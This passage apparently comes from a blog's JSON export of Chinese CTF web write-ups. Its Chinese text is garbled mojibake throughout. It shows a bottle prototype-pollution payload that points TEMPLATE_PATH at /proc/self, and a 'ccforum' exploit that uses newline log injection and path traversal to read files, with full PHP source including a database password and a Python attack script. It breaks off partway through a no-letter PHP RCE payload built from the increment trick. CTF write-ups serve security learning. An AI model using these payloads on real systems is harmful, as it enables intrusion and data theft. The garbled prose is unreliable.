è·¯å¾„å°±æ˜¯ helpers â½‚ä»¶ä¸­çš„ RESTRICTED_KEYS value:[]#ä¿®æ”¹æˆä¸ºçš„å€¼å°±æ˜¯ç©ºåˆ—è¡¨ 1 2 3 name=setval # æ±¡æŸ“å¯¹è±¡æ˜¯ setval path:\u0026#34;__globals__.bottle.TEMPLATE_PATH\u0026#34; # è·¯å¾„æ˜¯æ¨¡æ¿â½‚ä»¶è·¯å¾„ value:[../../../../proc/self] # ä¿®æ”¹ä¸ºçš„å€¼æ˜¯å­˜å‚¨ç¯å¢ƒå˜é‡â½‚ä»¶è·¯å¾„ï¼Œå› ä¸ºé¢˜â½¬æç¤ºflagåœ¨ç¯å¢ƒå˜é‡ä¸­name=setval æ·±åº¦è§£æï¼šæ­¤paylaodå¯»æ‰¾setvalå‡½æ•°ï¼Œå°†è¯¥å‡½æ•°å¾€ä¸ŠæŸ¥è¯¢____globals____.ï¼ˆ__globals__ æ˜¯å‡½æ•°å¯¹è±¡çš„ä¸€ä¸ªå±æ€§ï¼Œå®ƒä¼šè¿”å›ä¸€ä¸ªåŒ…å«è¯¥å‡½æ•°å…¨å±€å‘½åç©ºé—´çš„å­—å…¸ï¼‰,ç„¶åè°ƒç”¨bottleæ¡†æ¶ä¸­çš„TEMPLATE_PATH(æŒ‡å®šæ¨¡æ¿æ–‡ä»¶æ‰€åœ¨çš„è·¯å¾„)ï¼Œå°†è·¯å¾„è®¾ç½®ä¸º/proc/self/è¿™æ ·è®¿é—®pathæ—¶ä¼šè‡ªåŠ¨è·³è½¬åˆ°è¿™ä¸ªè·¯å¾„ä¸‹\næµç¨‹ï¼š\n1 2 3 4 5 { \u0026#34;path\u0026#34;:\u0026#34;helpers.RESTRICTED_KEYS\u0026#34;, \u0026#34;value\u0026#34;:[ ] } æ³¨æ„typeæ”¹æˆjson\n1 2 3 4 { \u0026#34;path\u0026#34;:\u0026#34;__globals__.bottle.TEMPLATE_PATH\u0026#34;, \u0026#34;value\u0026#34;:[\u0026#34;/proc/self\u0026#34;] } ","date":"2025-03-26T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2025-nctf-web/","title":"2025-nctf-web"},{"content":" ccforum Seayå®¡è®¡ä¸€ä¸‹ä»£ç \nadmin.phpä¸config.phpå­˜åœ¨file_get_contentå‡½æ•°ï¼Œå³å­˜åœ¨æ–‡ä»¶è¯»å–æ¼æ´ï¼Œé‚£ä¹ˆå…ˆå®¡è®¡admin.php\nadmin.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 \u0026lt;?php // å¼•å…¥é…ç½®æ–‡ä»¶ï¼Œé€šå¸¸åŒ…å«æ•°æ®åº“è¿æ¥ä¿¡æ¯ç­‰ require \u0026#39;config.php\u0026#39;; // æ£€æŸ¥è¯·æ±‚æ–¹æ³•æ˜¯å¦ä¸ºPOSTï¼Œå¦‚æœæ˜¯ï¼Œåˆ™å¤„ç†ç™»å½•é€»è¾‘ if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39;) { // è·å–POSTè¯·æ±‚ä¸­çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œé»˜è®¤å€¼ä¸ºç©ºå­—ç¬¦ä¸² $username = $_POST[\u0026#39;username\u0026#39;] ?? \u0026#39;\u0026#39;; $password = $_POST[\u0026#39;password\u0026#39;] ?? \u0026#39;\u0026#39;; try { // å‡†å¤‡SQLè¯­å¥ï¼ŒæŸ¥è¯¢adminsè¡¨ä¸­ç”¨æˆ·ååŒ¹é…çš„è®°å½• $stmt = $pdo-\u0026gt;prepare(\u0026#34;SELECT * FROM admins WHERE username = ?\u0026#34;); // æ‰§è¡ŒæŸ¥è¯¢ï¼Œä¼ å…¥ç”¨æˆ·åä½œä¸ºå‚æ•° $stmt-\u0026gt;execute([$username]); // è·å–æŸ¥è¯¢ç»“æœ $admin = $stmt-\u0026gt;fetch(); // å¦‚æœæŸ¥è¯¢åˆ°ç®¡ç†å‘˜ä¸”å¯†ç éªŒè¯é€šè¿‡ if ($admin \u0026amp;\u0026amp; password_verify($password, $admin[\u0026#39;password\u0026#39;])) { // è®¾ç½®ä¼šè¯å˜é‡ï¼Œæ ‡è¯†ç®¡ç†å‘˜ç™»å½•çŠ¶æ€ $_SESSION[\u0026#39;admin_id\u0026#39;] = $admin[\u0026#39;id\u0026#39;]; $_SESSION[\u0026#39;admin_username\u0026#39;] = $admin[\u0026#39;username\u0026#39;]; $_SESSION[\u0026#39;admin\u0026#39;] = true; // è®°å½•ç™»å½•æˆåŠŸçš„æ“ä½œæ—¥å¿— log_action($username, \u0026#39;admin_login\u0026#39;, 1); // é‡å®šå‘åˆ°ç®¡ç†å‘˜é¡µé¢ header(\u0026#34;Location: admin.php\u0026#34;); // ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ exit(); } else { // è®°å½•ç™»å½•å¤±è´¥çš„æ“ä½œæ—¥å¿— log_action($username, \u0026#39;admin_login\u0026#39;, 0, \u0026#39;Invalid credentials\u0026#39;); // è¾“å‡ºé”™è¯¯ä¿¡æ¯å¹¶ç»ˆæ­¢è„šæœ¬ die(\u0026#34;Invalid credentials\u0026#34;); } } catch (PDOException $e) { // æ•è·æ•°æ®åº“æ“ä½œå¼‚å¸¸ï¼Œè®°å½•é”™è¯¯æ—¥å¿— log_action($username, \u0026#39;admin_login\u0026#39;, 0, $e-\u0026gt;getMessage()); // è¾“å‡ºé”™è¯¯ä¿¡æ¯å¹¶ç»ˆæ­¢è„šæœ¬ die(\u0026#34;Admin login failed: \u0026#34; . $e-\u0026gt;getMessage()); } } // æ£€æŸ¥ä¼šè¯ä¸­æ˜¯å¦æ²¡æœ‰ç®¡ç†å‘˜ç™»å½•çŠ¶æ€ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™æ‹’ç»è®¿é—® if (!isset($_SESSION[\u0026#39;admin\u0026#39;]) || !$_SESSION[\u0026#39;admin\u0026#39;]) { die(\u0026#34;Access denied. Please login as admin.\u0026#34;); } // å®šä¹‰æ“ä½œæ—¥å¿—æ–‡ä»¶è·¯å¾„ $action_log_path = \u0026#39;/var/www/action.log\u0026#39;; // æ£€æŸ¥æ“ä½œæ—¥å¿—æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œåˆ™è¾“å‡ºé”™è¯¯ä¿¡æ¯å¹¶ç»ˆæ­¢è„šæœ¬ if (!file_exists($action_log_path)) { die(\u0026#34;Action log file not found.\u0026#34;); } // è¯»å–æ“ä½œæ—¥å¿—æ–‡ä»¶å†…å®¹ $action_log = file_get_contents($action_log_path); // å°†æ—¥å¿—å†…å®¹æŒ‰è¡Œåˆ†å‰²æˆæ•°ç»„ $log_lines = explode(\u0026#34;\\n\u0026#34;, $action_log); // åˆå§‹åŒ–è¢«å°ç¦ç”¨æˆ·å’Œå¤±è´¥æ—¥å¿—æ•°ç»„ $banned_users = []; $failed_logs = []; // éå†æ¯ä¸€è¡Œæ—¥å¿— foreach ($log_lines as $line) { // å¦‚æœè¡Œä¸ºç©ºï¼Œè·³è¿‡ if (empty($line)) { continue; } // æŒ‰é€—å·åˆ†å‰²æ—¥å¿—è¡Œ $parts = explode(\u0026#39;,\u0026#39;, $line); // å¦‚æœåˆ†å‰²åçš„éƒ¨åˆ†æ•°é‡ä¸è¶³5ä¸ªï¼Œè·³è¿‡ if (count($parts) \u0026lt; 5) { continue; } // è·å–ç¼–ç åçš„ç”¨æˆ·åã€æ“ä½œç±»å‹ã€æˆåŠŸçŠ¶æ€å’Œé™„åŠ ä¿¡æ¯ $encoded_user = $parts[1]; $action = $parts[2]; $success = (int) $parts[3]; $additional_info = $parts[4]; //æ€»ç»“ä¸Šé¢çš„ä»£ç å°±æ˜¯è·å–/var/www/action.logç»™action_logï¼Œå†ç”¨ï¼Œåˆ†å‰²æˆpart // å¦‚æœæ“ä½œç±»å‹æ˜¯è®°å½•å°ç¦ if ($action === \u0026#39;record_banned\u0026#39;) { // å¦‚æœæ“ä½œæˆåŠŸ if ($success === 1) { // å°†é™„åŠ ä¿¡æ¯æ·»åŠ åˆ°è¢«å°ç¦ç”¨æˆ·æ•°ç»„ä¸­ $banned_users[$encoded_user][] = $additional_info; } else { // å°†é™„åŠ ä¿¡æ¯æ·»åŠ åˆ°å¤±è´¥æ—¥å¿—æ•°ç»„ä¸­ $failed_logs[] = $additional_info; } } } //è¿™é‡Œè¦æ±‚action==record_banned,success=1,ç„¶åè¿›è¡Œä¸‹é¢çš„éå†æ–‡ä»¶ç›®å½•çš„å†…å®¹å…¨éƒ¨ä¼ ç»™å‚æ•°ï¼Œ æ‰€ä»¥å¦‚æœæ„é€ {$encoded_user}ä¸º../../../,å°±ç›¸å½“ä¸å›åˆ°æ ¹ç›®å½•ï¼Œä»è€Œå¯èƒ½è¯»åˆ°flag // åˆå§‹åŒ–è¢«å°ç¦å†…å®¹æ•°ç»„ $banned_contents = []; // éå†è¢«å°ç¦ç”¨æˆ·æ•°ç»„ foreach ($banned_users as $encoded_user =\u0026gt; $logs) { // æ„é€ è¢«å°ç¦ç”¨æˆ·ç›®å½•è·¯å¾„ $banned_dir = \u0026#34;/var/www/banned/{$encoded_user}\u0026#34;;//æ„é€ {$encoded_user}ä¸º../../../ï¼Œä¹‹åç›´æ¥è¯»æ ¹ç›®å½• // å¦‚æœç›®å½•å­˜åœ¨ if (file_exists($banned_dir)) { // è·å–ç›®å½•ä¸­çš„æ–‡ä»¶åˆ—è¡¨ $files = scandir($banned_dir); // éå†æ–‡ä»¶åˆ—è¡¨ foreach ($files as $file) { // è·³è¿‡ç›®å½•æœ¬èº«å’Œçˆ¶ç›®å½• if ($file !== \u0026#39;.\u0026#39; \u0026amp;\u0026amp; $file !== \u0026#39;..\u0026#39;) { // æ„é€ æ–‡ä»¶è·¯å¾„ $file_path = $banned_dir . \u0026#39;/\u0026#39; . $file; // è¯»å–æ–‡ä»¶å†…å®¹ $content = file_get_contents($file_path); // å°†å†…å®¹æ·»åŠ åˆ°è¢«å°ç¦å†…å®¹æ•°ç»„ä¸­ $banned_contents[$username][] = $content; } } } } ?\u0026gt; æ¥ä¸‹æ¥è¦çŸ¥é“action.logçš„å†…å®¹ï¼Œæ‰€ä»¥å…ˆçœ‹çœ‹config.phpæ–‡ä»¶\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 // å¯åŠ¨ä¼šè¯ session_start(); // å®šä¹‰æ•°æ®åº“è¿æ¥å‚æ•° define(\u0026#39;DB_HOST\u0026#39;, \u0026#39;127.0.0.1\u0026#39;); define(\u0026#39;DB_PORT\u0026#39;, \u0026#39;3306\u0026#39;); define(\u0026#39;DB_NAME\u0026#39;, \u0026#39;forum\u0026#39;); define(\u0026#39;DB_USER\u0026#39;, \u0026#39;mgr\u0026#39;); define(\u0026#39;DB_PASS\u0026#39;, \u0026#39;j92wn0UXFYsUAFiN\u0026#39;); try { // åˆ›å»ºPDOå®ä¾‹ï¼Œè¿æ¥åˆ°MySQLæ•°æ®åº“ $pdo = new PDO( \u0026#34;mysql:host=\u0026#34; . DB_HOST . \u0026#34;;port=\u0026#34; . DB_PORT . \u0026#34;;dbname=\u0026#34; . DB_NAME, DB_USER, DB_PASS, [PDO::ATTR_ERRMODE =\u0026gt; PDO::ERRMODE_EXCEPTION] // è®¾ç½®é”™è¯¯æ¨¡å¼ä¸ºå¼‚å¸¸ ); } catch (PDOException $e) { // å¦‚æœè¿æ¥å¤±è´¥ï¼Œè¾“å‡ºé”™è¯¯ä¿¡æ¯å¹¶ç»ˆæ­¢è„šæœ¬ die(\u0026#34;Database connection failed: \u0026#34; . $e-\u0026gt;getMessage()); } // å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå¯¹ç”¨æˆ·åè¿›è¡ŒBase64ç¼–ç  function encode_uname($username) { return base64_encode($username); } // å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºè®°å½•æ“ä½œæ—¥å¿— function log_action($username, $action, $succ, $additional = \u0026#39;\u0026#39;) { // ç”Ÿæˆå”¯ä¸€çš„æ—¥å¿—ID $log_id = uniqid(); // å¯¹ç”¨æˆ·åè¿›è¡Œç¼–ç  $e_username = encode_uname($username); // æ ¼å¼åŒ–æ—¥å¿—è¡Œ $log_line = sprintf( \u0026#34;%s,%s,%s,%d,%s\\n\u0026#34;, $log_id, $e_username, $action, $succ, $additional ); // å°†æ—¥å¿—è¡Œè¿½åŠ åˆ°æ“ä½œæ—¥å¿—æ–‡ä»¶ä¸­ file_put_contents(\u0026#39;/var/www/action.log\u0026#39;, $log_line, FILE_APPEND); } // å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºè®°å½•å°ç¦æ“ä½œ function record_banned($username, $banned) { // å¯¹ç”¨æˆ·åè¿›è¡Œç¼–ç  $e_username = encode_uname($username); // æ„é€ è¢«å°ç¦ç”¨æˆ·ç›®å½•è·¯å¾„ $banned_dir = \u0026#34;/var/www/banned/{$e_username}\u0026#34;; // å‡è®¾ç›®å½•åˆ›å»ºæˆåŠŸ $created = true; // å¦‚æœç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™å°è¯•åˆ›å»º if (!file_exists($banned_dir)) { $created = mkdir($banned_dir, 0750); // è®¾ç½®ç›®å½•æƒé™ä¸º0750 } // åˆå§‹åŒ–æ—¥å¿—ä¿¡æ¯å’ŒæˆåŠŸçŠ¶æ€ $log = \u0026#34;\u0026#34;; $succ = 1; // å¦‚æœç›®å½•åˆ›å»ºå¤±è´¥ if (!$created) { $succ = 0; // è®¾ç½®æˆåŠŸçŠ¶æ€ä¸ºå¤±è´¥ $log = \u0026#34;Failed to create record directory for \u0026#34; . $username; // è®°å½•é”™è¯¯ä¿¡æ¯ } else { // æ„é€ æ–‡ä»¶åï¼Œä½¿ç”¨å½“å‰æ—¶é—´æˆ³ $filename = $banned_dir . \u0026#39;/\u0026#39; . time() . \u0026#39;.txt\u0026#39;; // å°è¯•å°†å°ç¦å†…å®¹å†™å…¥æ–‡ä»¶ if (!file_put_contents($filename, $banned)) { $succ = 0; // å¦‚æœå†™å…¥å¤±è´¥ï¼Œè®¾ç½®æˆåŠŸçŠ¶æ€ä¸ºå¤±è´¥ $log = \u0026#34;Failed to record banned content\u0026#34;; // è®°å½•é”™è¯¯ä¿¡æ¯ } } // è°ƒç”¨log_actionå‡½æ•°è®°å½•å°ç¦æ“ä½œçš„æ—¥å¿— log_action($username, \u0026#39;record_banned\u0026#39;, $succ, $log); } // å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºæ£€æŸ¥å†…å®¹æ˜¯å¦åŒ…å«æ•æ„Ÿè¯ function has_sensitive_words($content) { // å®šä¹‰æ•æ„Ÿè¯åˆ—è¡¨ $SENSITIVE_WORDS = [\u0026#39;æ•æ„Ÿè¯\u0026#39;, \u0026#39;SENSITIVE WORDS\u0026#39;,]; // éå†æ•æ„Ÿè¯åˆ—è¡¨ foreach ($SENSITIVE_WORDS as $word) { // ä½¿ç”¨striposå‡½æ•°ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰æ£€æŸ¥å†…å®¹ä¸­æ˜¯å¦åŒ…å«æ•æ„Ÿè¯ if (stripos($content, $word) !== false) { // å¦‚æœæ‰¾åˆ°æ•æ„Ÿè¯ï¼Œè¿”å›true return true; } } // å¦‚æœæ²¡æœ‰æ‰¾åˆ°æ•æ„Ÿè¯ï¼Œè¿”å›false return false; } é¦–å…ˆçœ‹log_actionå‡½æ•°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function log_action($username, $action, $succ, $additional = \u0026#39;\u0026#39;) { // ç”Ÿæˆå”¯ä¸€çš„æ—¥å¿—ID $log_id = uniqid(); // å¯¹ç”¨æˆ·åè¿›è¡Œç¼–ç  $e_username = encode_uname($username); // æ ¼å¼åŒ–æ—¥å¿—è¡Œ $log_line = sprintf( \u0026#34;%s,%s,%s,%d,%s\\n\u0026#34;, $log_id, $e_username, $action, $succ, $additional ); // å°†æ—¥å¿—è¡Œè¿½åŠ åˆ°æ“ä½œæ—¥å¿—æ–‡ä»¶ä¸­ file_put_contents(\u0026#39;/var/www/action.log\u0026#39;, $log_line, FILE_APPEND); } çœ‹è¿™ä¸ªä»£ç çŸ¥é“ï¼Œlog_idæ˜¯å”¯ä¸€ç”Ÿæˆçš„ï¼Œä¸å¯æ§åˆ¶ï¼Œe_usernameè¢«åŠ å¯†ï¼Œä¸å¥½æ§åˆ¶è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œactionè¦=record_banned,success=1ï¼Œæ‰€ä»¥åªèƒ½æ§åˆ¶additional(å®ƒåˆšå¥½ä¸ºç©º)\næ¥ä¸‹æ¥å¯»æ‰¾è°ƒç”¨action_logçš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯record_bannedå‡½æ•°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 function record_banned($username, $banned) { // å¯¹ç”¨æˆ·åè¿›è¡Œç¼–ç  $e_username = encode_uname($username); // æ„é€ è¢«å°ç¦ç”¨æˆ·ç›®å½•è·¯å¾„ $banned_dir = \u0026#34;/var/www/banned/{$e_username}\u0026#34;; // å‡è®¾ç›®å½•åˆ›å»ºæˆåŠŸ $created = true; // å¦‚æœç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™å°è¯•åˆ›å»º if (!file_exists($banned_dir)) { $created = mkdir($banned_dir, 0750); // è®¾ç½®ç›®å½•æƒé™ä¸º0750 } // åˆå§‹åŒ–æ—¥å¿—ä¿¡æ¯å’ŒæˆåŠŸçŠ¶æ€ $log = \u0026#34;\u0026#34;; $succ = 1; // å¦‚æœç›®å½•åˆ›å»ºå¤±è´¥ if (!$created) { $succ = 0; // è®¾ç½®æˆåŠŸçŠ¶æ€ä¸ºå¤±è´¥ $log = \u0026#34;Failed to create record directory for \u0026#34; . $username; // è®°å½•é”™è¯¯ä¿¡æ¯ } else { // æ„é€ æ–‡ä»¶åï¼Œä½¿ç”¨å½“å‰æ—¶é—´æˆ³ $filename = $banned_dir . \u0026#39;/\u0026#39; . time() . \u0026#39;.txt\u0026#39;; // å°è¯•å°†å°ç¦å†…å®¹å†™å…¥æ–‡ä»¶ if (!file_put_contents($filename, $banned)) { $succ = 0; // å¦‚æœå†™å…¥å¤±è´¥ï¼Œè®¾ç½®æˆåŠŸçŠ¶æ€ä¸ºå¤±è´¥ $log = \u0026#34;Failed to record banned content\u0026#34;; // è®°å½•é”™è¯¯ä¿¡æ¯ } } // è°ƒç”¨log_actionå‡½æ•°è®°å½•å°ç¦æ“ä½œçš„æ—¥å¿— log_action($username, \u0026#39;record_banned\u0026#39;, $succ, $log); } è¿™é‡Œè‹¥æ˜¯æƒ³ä¼ å…¥/var/www/action.logåæƒ³è¦å˜é‡æ ¹ç›®å½•æ‰€æœ‰æ–‡ä»¶ï¼Œå¿…é¡»æœ‰æŸä¸€è¡Œæ»¡è¶³?(path[0]æ˜¯idä¸ç”¨ç®¡)ï¼Œ../../../,record_banned,1,(path[4]æ— è¦æ±‚)ï¼Œç¬¬ä¸€è¡Œæ˜¯ç»å¯¹ä¸å¯èƒ½ï¼Œå› ä¸ºusernameè¢«base64åŠ å¯†ï¼Œæ‰€ä»¥ç¬¬ä¸€è¡Œå°±æ„é€ ä¸äº†../../../ï¼ˆå› ä¸ºæ²¡æœ‰ä»€ä¹ˆåŠ å¯†åæ˜¯../../../ï¼‰,æ‰€ä»¥å°±åœ¨ç¬¬äºŒè¡Œæ„é€ ?,../../../,record_banned,1,?ã€‚é‚£ä¹ˆå°±è¦åœ¨logä¸‹æ‰‹äº†\nè¿™é‡Œ$logæœ‰3ç§æƒ…å†µï¼Œç©ºæˆ–Failed to create record directory for \u0026quot; . $username;æˆ–\u0026quot;Failed to record banned content\u0026quot;ï¼›æ˜¾ç„¶æˆ‘ä»¬è¦é€šè¿‡æ„é€ usernameè¿™ä¸ªå˜é‡è¾¾åˆ°ç›®çš„ã€‚æ‰€ä»¥log=\u0026ldquo;Failed to create record directory for \u0026quot; . $username;è¦åˆ°è¾¾è¿™ä¸ªç›®çš„ï¼Œå°±è¦ä½¿åˆ›å»ºç›®å½•å¤±è´¥ï¼Œmkdiræ–¹æ³•ä¸å¯ä»¥åˆ›å»ºå¤šçº§ç›®å½•ï¼Œå³å…¶ä¸­ä¸èƒ½åŒ…å«/å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´usernameç¼–ç ååŒ…å«/,æ°å¥½???ç¼–ç åæœ‰/\nç¬¬äºŒè¡Œæ€ä¹ˆå‡ºæ¥ï¼Ÿæ˜¾ç„¶è¦%0a,é‚£è¿˜è¦æ»¡è¶³ç¬¬äºŒè¡ŒåŒ…æ‹¬?,../../../,record_banned,? é‚£å¾ˆæ˜¾ç„¶äº†ï¼Œusername=???%0a,../../../,record_banned,1,\næ‰€ä»¥å†™å…¥/var/www/action.logçš„å†…å®¹æ˜¯\nid,encode_base64(???%0a,../../../,record_banned,1,),record_banned,1,Failed to create record directory for ???%0a,../../../,record_banned,1, ç»è¿‡åˆ†è¡Œåç¬¬ä¸€è¡Œæ˜¯\nid,encode_base64(???%0a,../../../,record_banned,1,),record_banned,1,Failed to create record directory for ???\nç¬¬äºŒè¡Œæ˜¯,../../../,record_banned,1, ç¬¦åˆè¦æ±‚ï¼\næ¥ä¸‹æ¥æ‰¾è°ƒç”¨record_bannedçš„å‡½æ•°ï¼Œåœ¨post.phpé‡Œ\nhas_sensitive_wordsåœ¨config.phpé‡Œ\næ˜¾ç„¶è¦ç¬¦åˆhas_sensitive_words($title) || has_sensitive_words($content)ï¼Œå³è®©titleæˆ–contentå­˜åœ¨æ•æ„Ÿè¯æˆ–è€… SENSITIVE WORDS\næ‰€ä»¥è§£é¢˜æ€è·¯ã€\n1.å…ˆæ³¨å†Œç”¨æˆ·username=???\\n,../../../,record_banned,1, password=111111111(ä»»æ„å†…å®¹ï¼Œæ»¡è¶³é•¿åº¦å°±å¥½,æ‰‹åŠ¨æ³¨å†Œçš„è¯\\nè¦å†™æˆ%0a)\n2.è®¿é—®postè·¯ç”±ï¼Œpostä¼ å‚titleæˆ–è€…content\n3.ç™»å…¥ç®¡ç†å‘˜è´¦æˆ·ï¼Œè¿›å…¥admin.php,æ‹¿åˆ°flagï¼ˆçˆ†ç ´ï¼‰\nç›´æ¥æ‰“è„šæœ¬ä¹Ÿè¡Œï¼Œç„¶åç›´æ¥è®¿é—®admin.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from requests import Session basic = \u0026#34;http://ip:9090/\u0026#34; data = {\u0026#34;username\u0026#34;: \u0026#34;???\\n,../../../,record_banned,1,\u0026#34;,\u0026#34;password\u0026#34;: \u0026#34;111111111111\u0026#34;,} def register(sess: Session): resp = sess.post(basic + \u0026#34;/register.php\u0026#34;, data=data) def login(sess: Session): resp = sess.post(basic + \u0026#34;/login.php\u0026#34;, data=data) def post(sess: Session): data1 = { \u0026#34;title\u0026#34;: \u0026#34;æ•æ„Ÿè¯\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;tset\u0026#34;, } resp = sess.post(basic + \u0026#34;/post.php\u0026#34;, data=data1) if __name__ == \u0026#34;__main__\u0026#34;: sess = Session() register(sess) login(sess) post(sess) ","date":"2025-03-26T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2025-%E9%95%BF%E5%9F%8E%E6%9D%AF-ccforum/","title":"2025-é•¿åŸæ¯-ccforum"},{"content":"ez_php è¿™é¢˜å‰é¢ç®€å•ï¼Œä¸å¤šè¯´\n1 2 postä¼ ï¼ša[]=1\u0026amp;b[]=2 getä¼ :?password=123456a è§£æ³•ä¸€æ—¥å¿—åŒ…å« æ¥ä¸‹æ¥æˆ‘æ‰“çš„æ˜¯æ—¥å¿—åŒ…å«ï¼Œç®—æ˜¯éé¢„æœŸ\nå„å‘åŒ…2æ¬¡å“ˆ\nè§£æ³•äºŒæ‰“è‡ªå¢ æ–‡ä»¶åŒ…å«è¯»å–åï¼Œæœ‰base64å­—ç¬¦ï¼ˆè¿˜ä¸€ä¸ªéé¢„æœŸç›´æ¥/fileå°±èƒ½å‡ºflagï¼‰\n1 file=php://filter/read=convert.base64-encode/resource=level2.php è§£ç å¾—åˆ°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php error_reporting(0); if (isset($_POST[\u0026#39;rce\u0026#39;])) { $rce = $_POST[\u0026#39;rce\u0026#39;]; if (strlen($rce) \u0026lt;= 120) { if (is_string($rce)) { if (!preg_match(\u0026#34;/[!@#%^\u0026amp;*:\u0026#39;\\-\u0026lt;?\u0026gt;\\\u0026#34;\\/|`a-zA-Z~\\\\\\\\]/\u0026#34;, $rce)) { eval($rce); } else { echo(\u0026#34;Are you hack me?\u0026#34;); } } else { echo \u0026#34;I want string!\u0026#34;; } } else { echo \u0026#34;too long!\u0026#34;; } } ?\u0026gt; è¿™é‡Œæ— å­—æ¯rceï¼Œä¸”è¿‡æ»¤äº†^,~,|,é‚£åªèƒ½æ‰“è‡ªå¢ï¼ˆå…¶å®ä¹Ÿå¯ä»¥fuzzä¸€ä¸‹çœ‹çœ‹å¯ä»¥ç”¨å“ªäº›ï¼‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php // å®šä¹‰æ­£åˆ™è¡¨è¾¾å¼ $pattern = \u0026#34;/[a-zA-Z0-9@#%^\u0026amp;*:{}\\-\u0026lt;\\?\u0026gt;\\\u0026#34;|`~\\\\\\\\]/\u0026#34;; // å­˜å‚¨æœªè¢«è¿‡æ»¤çš„å­—ç¬¦ $unfilteredChars = []; // éå† ASCII ç ä» 32 åˆ° 127 for ($i = 32; $i \u0026lt;= 127; $i++) { $char = chr($i); // è·å–å¯¹åº”çš„å­—ç¬¦ if (!preg_match($pattern, $char)) { // æ£€æŸ¥æ˜¯å¦æœªè¢«è¿‡æ»¤ $unfilteredChars[] = $char; // æ·»åŠ åˆ°æœªè¿‡æ»¤å­—ç¬¦æ•°ç»„ } } // è¾“å‡ºæœªè¢«è¿‡æ»¤çš„å­—ç¬¦ echo \u0026#34;æœªè¢«è¿‡æ»¤çš„å­—ç¬¦: \u0026#34; . implode(\u0026#39;\u0026#39;, $unfilteredChars) . \u0026#34;\\n\u0026#34;; ?\u0026gt; é‚£æ˜¾ç„¶åªèƒ½æ‰“è‡ªå¢\nè‡ªå¢è§„åˆ™ç®€å•ï¼Œæ¯”å¦‚$a=\u0026lsquo;A\u0026rsquo;;$a++=\u0026lsquo;B\u0026rsquo;,æ‰€ä»¥åªè¦ä¸€ä¸ªå­—æ¯A,æˆ‘å°±å¯ä»¥æ„é€ ä¸€ä¸ª$_GET,è¿™æ ·å°±å¯ä»¥ç»™ _ è¿˜æœ‰__èµ‹å€¼ï¼ˆè¿™é‡Œæœ‰æ•°å­—ï¼Œä½†æ˜¯è¿˜æ˜¯ç”¨_,å› ä¸ºæˆ‘è¿™ä¸ªç…§ç€æ— æ•°å­—å­—æ¯rceæ‰“ï¼Œç›¸å½“äºé€šç”¨payloadï¼‰ï¼Œä»è€Œåˆ°è¾¾å‘½ä»¤æ‰§è¡Œçš„ç›®çš„,é‚£è¿™ä¸ªAæ€ä¹ˆçš„å¾—åˆ°?\nåœ¨phpä¸­ï¼Œæ•°ç»„ä¸å­—ç¬¦ä¸²è¿æ¥ï¼Œä¼šè¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå€¼å°±æ˜¯Array,é‚£å°±ç›¸å¯¹äºæ‹¿åˆ°äº†æ‰€æœ‰å­—æ¯\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php $_=[].\u0026#39;\u0026#39;;//Array $_=$_[\u0026#39;\u0026#39;==\u0026#39;$\u0026#39;];//A $_++;//B $_++;//C $_++;//D $_++;//E $__=$_;//E $_++;//F $_++;//G $___=$_;//G $_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;//T $_=$___.$__.$_;//GET //var_dump($_); $_=\u0026#39;_\u0026#39;.$_;//_GET var_dump($$_[_]($$_[__])); //$_GET[_]($_GET[__]) æ¥ä¸‹æ¥å°±å¯ä»¥å°è¯•å»ç»™_å’Œ__GETä¼ å‚ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦æŠŠæ¢è¡Œçš„éƒ½å»æ‰ï¼Œç„¶åè¿›è¡Œä¸€æ¬¡URLç¼–ç ï¼Œå› ä¸ºä¸­é—´ä»¶ä¼šè§£ç ä¸€æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ çš„payloadå…ˆå˜æˆè¿™æ ·\n1 